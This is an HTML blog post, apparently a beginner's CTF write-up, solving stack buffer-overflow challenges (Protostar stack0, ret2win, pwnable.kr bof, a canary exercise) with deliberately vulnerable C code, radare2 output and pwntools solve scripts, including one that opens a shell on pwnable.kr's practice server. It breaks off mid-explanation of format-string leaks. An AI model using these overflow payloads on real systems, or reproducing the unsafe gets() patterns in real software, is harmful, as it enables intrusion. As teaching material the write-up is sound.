@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>PWN Journey: Part 1 :: Yet, another infosec blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome." />
+<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/pwns-1/" />
+
+
+
+
+<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">
+
+  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="The Archivist" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PWN Journey: Part 1">
+<meta property="og:description" content="Foreword Greetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome." />
+<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/pwns-1/" />
+<meta property="og:site_name" content="Yet, another infosec blog" />
+
+  
+    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="PWN Journey" />
+
+
+  <meta property="article:published_time" content="2021-12-29 09:30:00 &#43;1345 &#43;1345" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/blog/en/">
+  <div class="logo">
+    <style>
+      .blink {
+        animation: blinker 1s linear infinite;
+        color: red!important;
+}
+.logo_anchor
+{
+  color: blue!important;
+}
+
+@keyframes blinker {
+  50% {
+    opacity: 0;
+  }
+}
+    </style>
+    <div class="logo_anchor">
+      ./&ThinSpace; 
+    </div>
+      Archivist
+    <div class="blink"> # </div> 
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/blog/en/posts">1.Posts</a></li>
+        
+      
+        
+          <li><a href="/blog/en/categories">2.Categories</a></li>
+        
+      
+        
+          <li><a href="/blog/en/tags">3.Tags</a></li>
+        
+      
+        
+          <li><a href="/blog/en/about">4.About</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">More ▾</li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+              
+            
+              
+                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/blog/en/posts">1.Posts</a></li>
+      
+    
+      
+        <li><a href="/blog/en/categories">2.Categories</a></li>
+      
+    
+      
+        <li><a href="/blog/en/tags">3.Tags</a></li>
+      
+    
+      
+        <li><a href="/blog/en/about">4.About</a></li>
+      
+    
+      
+        <li><a href="/blog/en/sitemap.xml">RSS</a></li>
+      
+    
+      
+        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://legiahuyy.github.io/blog/en/posts/pwns-1/">PWN Journey: Part 1</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-12-29
+        
+      </span>
+    
+    
+      <span class="post-author">:: The Archivist</span>
+    
+    
+      <span class="post-reading-time">:: 12 min read (2504 words)</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/write-up/">write-up</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/pwn/">pwn</a>&nbsp;
+    
+    #<a href="https://legiahuyy.github.io/blog/en/tags/radare2/">radare2</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foreword">Foreword</a></li>
+    <li><a href="#protostar-stack0-reproduced">Protostar stack0 (reproduced)</a>
+      <ul>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#solvepy">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#ret2win-reproduce">ret2win (reproduce)</a>
+      <ul>
+        <li><a href="#code-breakdown">Code breakdown</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+        <li><a href="#solvepy-1">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwnablekr---bof">Pwnable.kr - bof</a>
+      <ul>
+        <li><a href="#code-breakdown-1">Code breakdown</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+        <li><a href="#solvepy-2">Solve.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#canary-custom">Canary (custom)</a>
+      <ul>
+        <li><a href="#code-breakdown-2">Code breakdown</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+        <li><a href="#solvepy-3">Solve.py</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h2 id="foreword">Foreword<a href="#foreword" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Greetings, this series of posts delves into a collection of <em>pwnie</em> solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.</p>
+<!-- raw HTML omitted -->
+<p>Notwithstanding these step-by-step solutions, I still strongly encourage readers to reproduce or alter the challenges in their own way. Moreover, please do keep in mind that the solutions are not being put in any level orders, even the first ones can be much complicated for you to fully digest. With that said, then scratching your head for hours, diving into the basics and bending them to your needs is a minimum requirement to achieve your goal.</p>
+<p>Anyway, I hope you have a good time learning.</p>
+<h2 id="protostar-stack0-reproduced">Protostar stack0 (reproduced)<a href="#protostar-stack0-reproduced" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Change the value of <code>modified</code> to any but 0.</p>
+<p>The <em>original challenge</em> can be found <a href="https://exploit.education/protostar/stack-zero/">here</a>. You should practice this challenge using Protostar VM first since it is built as a 32-bit ELF, much simpler and straightforward.</p>
+<p>This particular version of stack0, however, is expected to be built and executed on a variety of different architectures, customizations, and such others.</p>
+<p>Description:</p>
+<pre tabindex="0"><code>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
+</code></pre><p>Source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// NOTE: I don&#39;t use the VM provided by Protostar. So I will include my build options within the source.
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Build: $ gcc -g stack0.c -o stack0 -no-pie -fno-stack-protector -z execstack
+</span><span style="color:#75715e">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;	<span style="color:#75715e">// volatile keyword ensures that this variable is not optimized (deleted) by compilers as it is not being used or modified at all
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
+
+  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  gets(buffer);
+
+  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+      printf(<span style="color:#e6db74">&#34;you have changed the &#39;modified&#39; variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  } <span style="color:#66d9ef">else</span> {
+      printf(<span style="color:#e6db74">&#34;Try again?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+  }
+}
+</code></pre></div><p>You can achieve the goal by triggering a buffer overflow in the <code>gets</code> function since it got flagged unsafe, according to MSDN:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-02.png" alt=""></p>
+<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Some of you have thought of inserting 64 random characters into the <code>buffer</code> variable and a random byte to write pass the <code>modified</code> variable itself then congratulation, you are correct&hellip; theoretically. If you are exercising the challenge connecting to Protostar VM, it should work properly; otherwise, you might encounter as follows:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-08_11-55.png" alt=""></p>
+<p>This happened mostly due to our stack alignment or compiler options being somewhat different from that of Protostar VM.</p>
+<p>Let us have a closer analysis at the assembly code.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-01.png" alt=""></p>
+<p>Put your focus around these lines:</p>
+<pre tabindex="0"><code>[0x7ffff7fd3050]&gt; s main;pdf
+            ; DATA XREF from entry0 @ 0x55555555507d
+┌ 79: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_50h @ rbp-0x50
+│           ; var int64_t var_4h @ rbp-0x4
+...
+│           0x555555555154      c745fc000000.  mov dword [var_4h], 0
+│           0x55555555515b      488d45b0       lea rax, [var_50h]
+│           0x55555555515f      4889c7         mov rdi, rax
+│           0x555555555162      b800000000     mov eax, 0
+│           0x555555555167      e8d4feffff     call sym.imp.gets       ; char *gets(char *s)
+│           0x55555555516c      8b45fc         mov eax, dword [var_4h]
+...
+</code></pre><p>Based on the code, <code>gets</code> reads a line from STDIN and the size of the buffer can be inferred by subtracting the end address (i.e, <code>rbp-0x50</code>) with  the start address (i.e, <code>rbp-0x4</code>). Hence, <code>buf_size = 0x50 - 0x4 = 0x4c = 76 (decimal)</code>.</p>
+<h3 id="solvepy">Solve.py<a href="#solvepy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>And from that we now know how many characters are needed to overflow the buffer, but remember we still have to overwrite the <code>modified</code> variable.</p>
+<p>So here is our one-liner.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#e6db74">&#39;print(b&#34;a&#34;*76 + b&#34;modified_val&#34;)&#39;</span> | ./stack0
+</code></pre></div><p>Goal achieved.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_09-30.png" alt=""></p>
+<hr>
+<h2 id="ret2win-reproduce">ret2win (reproduce)<a href="#ret2win-reproduce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Successfully overwrite the return pointer to execute <code>win()</code>.</p>
+<p>A random 32-bit challenge on the Internet with only its source code provided. Same approach but in 64-bit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// Build: $ gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">unsafe</span>() {
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">40</span>];
+    
+    puts(<span style="color:#e6db74">&#34;Overflow me&#34;</span>);
+    gets(buffer);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
+    unsafe();
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
+    puts(<span style="color:#e6db74">&#34;Exploited!!!!!&#34;</span>);
+}
+</code></pre></div><h3 id="code-breakdown">Code breakdown<a href="#code-breakdown" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The program calls <code>unsafe()</code>, which contains a buffer overflow vulnerability at the <code>gets</code> with a buffer of 40 bytes. Furthermore, there is a <code>flag()</code> function but it is completely isolated, never to be called and we have to somehow invoke the function.</p>
+<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>As already mentioned, we need to find how many bytes to overflow and reach the return address pointer, thus 40 bytes is not enough. You can imagine our skeleton payload should roughly be as follows:</p>
+<pre tabindex="0"><code>payload = BUF_SIZE (40 bytes) + SOME_JUNK (?? bytes) + FLAG_ADDR (RIP)
+</code></pre><p>The <code>BUF_SIZE</code> and <code>SOME_JUNK</code> in combination, there is a generic term for it called <em>padding</em> and we have to determine the padding length before you can overwrite the value of <code>RIP</code>.</p>
+<p>Let me introduce you to the <strong>De Bruijn Sequence</strong>, which contains no string of <code>n</code> character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., <code>ragg2</code>, <code>cyclic</code>, <code>pattern_create (gdb)</code>).</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-11.png" alt=""></p>
+<p>The reason why a <em>random</em> gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, <code>RIP</code> (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called <em>random bytes</em> in <code>RIP</code> now is that of our padding length in the sequence pattern.</p>
+<p>Next, we want to load the binary in our debugger and find the padding length.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-40.png" alt=""></p>
+<p>and our registers table:</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_11-50.png" alt=""></p>
+<p>The <code>wopO `dr rip` </code> command simply finds the given value in <code>RIP</code> into a De Bruijn sequence at a current offset or you can just type <code>wopO 0x41415441</code> instead and it shows us our padding size, 56.</p>
+<pre tabindex="0"><code>payload = PADDING (56 bytes) + FLAG_ADDR (RIP)
+</code></pre><p>We have one last factor, the address of <code>flag()</code> which is <code>0x0040116b</code>. To get it, simply type <code>afl</code> for a list of functions and their addresses.</p>
+<pre tabindex="0"><code>[0x41415441]&gt; afl
+0x00401050    1 42           entry0
+0x00401090    4 33   -&gt; 31   sym.deregister_tm_clones
+0x004010c0    4 49           sym.register_tm_clones
+0x00401100    3 33   -&gt; 28   sym.__do_global_dtors_aux
+0x00401130    1 2            entry.init0
+0x004011e0    1 1            sym.__libc_csu_fini
+0x00401132    1 40           dbg.unsafe
+0x00401030    1 6            sym.imp.puts
+0x00401040    1 6            sym.imp.gets
+0x004011e4    1 9            sym._fini
+0x00401180    4 93           sym.__libc_csu_init
+0x00401080    1 1            sym._dl_relocate_static_pie
+0x0040115a    1 17           dbg.main
+0x0040116b    1 19           dbg.flag					; THIS ONE
+0x00401000    3 23           map._home_kali_Desktop_Study_PWN_etc_ret2win_vuln.r_x
+</code></pre><p>Using the built-in <code>grep</code>, radare should have the output optimized</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_12-02.png" alt=""></p>
+<h3 id="solvepy-1">Solve.py<a href="#solvepy-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now that we have the padding length, control <code>RIP</code> and <code>flag()</code> address.</p>
+<p>Hence, our final <code>solve.py</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+flag_rip <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040116b</span>)	<span style="color:#75715e"># pack flag_addr: \x6b\x11\x40\x00</span>
+padding <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>nop()) <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>	<span style="color:#75715e"># 56 bytes of NOP</span>
+
+payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> flag_rip
+
+r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./vuln&#39;</span>)
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;me</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, payload)
+print(r<span style="color:#f92672">.</span>clean())
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-09_13-22.png" alt=""></p>
+<hr>
+<h2 id="pwnablekr---bof">Pwnable.kr - bof<a href="#pwnablekr---bof" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Successfully modify the value of <code>key</code> to spawn a shell.</p>
+<p>This is an original challenge at <a href="https://pwnable.kr/play.php">pwnable.kr</a>.</p>
+<p>Description:</p>
+<pre tabindex="0"><code>Nana told me that buffer overflow is one of the most common software vulnerability. 
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+</code></pre><p>Provided source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">func</span>(<span style="color:#66d9ef">int</span> key){
+	<span style="color:#66d9ef">char</span> overflowme[<span style="color:#ae81ff">32</span>];
+	printf(<span style="color:#e6db74">&#34;overflow me : &#34;</span>);
+	gets(overflowme);	<span style="color:#75715e">// smash me!
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(key <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xcafebabe</span>){
+		system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+	}
+	<span style="color:#66d9ef">else</span>{
+		printf(<span style="color:#e6db74">&#34;Nah..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	}
+}
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]){
+	func(<span style="color:#ae81ff">0xdeadbeef</span>);
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h3 id="code-breakdown-1">Code breakdown<a href="#code-breakdown-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>There are only two function, <code>main</code> and <code>func</code>.</p>
+<p><code>main</code> basically calls <code>func</code> with <code>0xdeadbeef</code> as its sole <code>key</code> argument whose value is to be compared with <code>0xcafebabe</code> and if true, spawns a shell or, otherwise, prints <code>Nah..\n</code>. Not to mention the obvious buffer overflow as <code>func</code> creates a 32 bytes buffer then reads it with <code>gets</code>.</p>
+<h3 id="solution-2">Solution<a href="#solution-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Since we are not reproducing the challenge but downloading straight from the source, let us check its properties.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-14.png" alt=""></p>
+<p>Not a fan of radare2? Here is the simplified output from <a href="https://github.com/slimm609/checksec.sh">checksec</a>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_10-16.png" alt=""></p>
+<p>As it might be seen, the binary has NX, PIE, and canary bit enabled. Especially with stack canary, we are not able to determine the padding length with De Bruijn Sequence anymore. However, other protection bits are neither important nor able to interrupt our payload in this practice at all so I will skip them for now.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-17.png" alt=""></p>
+<p>Therefore, you have to evaluate these offsets manually.</p>
+<p>First, set a breakpoint after the <code>gets</code> function because the subsequent instruction is the comparison of <code>key</code> and <code>0xcafebabe</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-23.png" alt=""></p>
+<p>Then locate our buffer offset, which is <code>0xffef8ffc</code>, apparently.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-25.png" alt=""></p>
+<p>And variable <code>key</code>&rsquo;s offset, <code>0xffef9030</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-32.png" alt=""></p>
+<p>Evaluate this expression: <code>0xffef9030 - 0xffef8ffc = 0x34 = 52 (decimal) &lt;-- padding length</code>.</p>
+<p>Also, you can try using this shortcut instead of those weary steps.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>0x5658662c<span style="color:#f92672">]</span>&gt;? <span style="color:#e6db74">`</span>pxr <span style="color:#ae81ff">1</span> @ebp+8 ~<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span><span style="color:#e6db74">`</span> - <span style="color:#e6db74">`</span>dr eax<span style="color:#e6db74">`</span>
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_11-51.png" alt=""></p>
+<p>Hence, our skeleton payload:</p>
+<pre tabindex="0"><code>payload = PADDING (52) + KEY_VALUE
+</code></pre><h3 id="solvepy-2">Solve.py<a href="#solvepy-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Either of these should work properly.</p>
+<p>One-liner: <code>python -c&quot;print(b'a'*52+b'\xbe\xba\xfe\xca')&quot; | tee payload &amp;&amp; (cat payload &amp;&amp; cat)| nc pwnable.kr 9000</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-16_09-21.png" alt=""></p>
+<p>Pwntools:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">52</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xcafebabe</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+	<span style="color:#66d9ef">if</span>(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>):
+		r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./bof&#39;</span>)
+	<span style="color:#66d9ef">else</span>:
+		r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwnable.kr&#39;</span>, <span style="color:#ae81ff">9000</span>)
+	r<span style="color:#f92672">.</span>clean()
+	r<span style="color:#f92672">.</span>sendline(payload)
+	r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-12-8-pwns-1/2021-12-14_12-07.png" alt=""></p>
+<h2 id="canary-custom">Canary (custom)<a href="#canary-custom" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><strong>Goal:</strong> Successfully bypass canary and call <code>win()</code>.</p>
+<p>Source:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// Build: $ gcc canary.c -o canary -no-pie -fstack-protector -z execstack
+</span><span style="color:#75715e">// The option &#34;-fstack-protector&#34; enables canary
+</span><span style="color:#75715e">// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>() {
+    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">32</span>];
+
+    puts(<span style="color:#e6db74">&#34;Leak me&#34;</span>);
+    gets(buffer);
+
+    printf(buffer);
+    puts(<span style="color:#e6db74">&#34;&#34;</span>);
+
+    puts(<span style="color:#e6db74">&#34;Overflow me&#34;</span>);
+    gets(buffer);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    vuln();
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+    puts(<span style="color:#e6db74">&#34;You won!&#34;</span>);
+}
+</code></pre></div><p>This simple challenge ideally demonstrates how we can bypass stack protection, as know as stack canary.</p>
+<p>But before being able to understand the crucial part, we should get hold of the protection bit first. To put it simply, at the prologue of a function, a random value is place onto the stack and before the program execute <code>ret</code>, the present value of that variable is to be compared with the initial and a <code>***stack smashing detected***</code> error message would show up thereafter if they are not the same; otherwise, exit normally.</p>
+<p><strong>Note:</strong> <em>Stack canaries in Linux is a bit more tricky as they end in <code>00</code>, which will null-terminated any strings in case you make mistakes using print functions. Still, it makes them much easier to spot.</em></p>
+<h3 id="code-breakdown-2">Code breakdown<a href="#code-breakdown-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>There are three functions: <code>main</code>, <code>vuln</code> and <code>win</code>.</p>
+<p><code>win</code> is isolated and <code>main</code> merely calls <code>vuln</code>. <code>vuln</code>, however, reads a buffer of 32 bytes twice, before and after printing it using <code>puts</code>.</p>
+<h3 id="solution-3">Solution<a href="#solution-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="1-brute-forcing">1. Brute-forcing<a href="#1-brute-forcing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Please do remember that this method <strong>works exclusively with 32-bit programs</strong> and sometimes is the sole solution when there are no leak capabilities. Since it is, unfortunately, not practicable with our particular 64-bit binary, we will discuss the method further at another time.</p>
+<h4 id="2-leaking-a-stack-canary">2. Leaking a Stack Canary<a href="#2-leaking-a-stack-canary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>This method aim is to read the value of the canary through a certain <strong>format string leakages</strong>, such as <code>read</code>, <code>strncpy</code>, <code>puts</code> and <code>printf</code>.</p>
+<p>A format string bug is a simple, yet, powerful auxiliary which if you can manipulate and leverage it to perform reading or even writing to arbitrary memory regions. Imagine you have a small code snippet as follows:</p>
